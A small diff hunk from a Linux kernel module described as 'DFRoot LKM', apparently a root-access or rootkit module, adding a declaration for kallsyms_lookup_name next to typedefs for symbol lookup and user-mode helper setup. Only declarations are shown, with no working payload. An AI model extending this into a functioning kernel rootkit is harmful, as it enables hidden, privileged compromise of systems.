@@ -8,6 +8,7 @@
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("DFRoot LKM");
 
+extern unsigned long kallsyms_lookup_name(const char *name);
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                              void *init, void *cleanup, void *data);
